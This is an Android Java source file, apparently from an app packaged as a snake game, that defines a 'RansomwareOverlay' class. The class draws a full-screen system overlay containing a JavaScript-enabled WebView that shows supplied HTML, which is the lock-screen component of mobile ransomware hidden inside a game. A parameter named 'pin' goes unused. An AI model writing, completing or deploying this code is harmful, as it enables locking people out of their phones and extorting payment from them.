package com.snakegame.premium;

import android.content.Context;
import android.view.WindowManager;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.widget.FrameLayout;
import android.graphics.PixelFormat;
import android.os.Build;

public class RansomwareOverlay {
    private WindowManager wm;
    private FrameLayout overlay;
    private WebView webView;
    private Context ctx;

    public RansomwareOverlay(Context c) { this.ctx = c; }

    public void show(String html, String pin) {
        wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT,
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        overlay = new FrameLayout(ctx);
        webView = new WebView(ctx);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
        overlay.addView(webView);
        wm.addView(overlay, params);
    }

    public void hide() {
        if (wm != null && overlay != null) wm.removeView(overlay);
    }
}
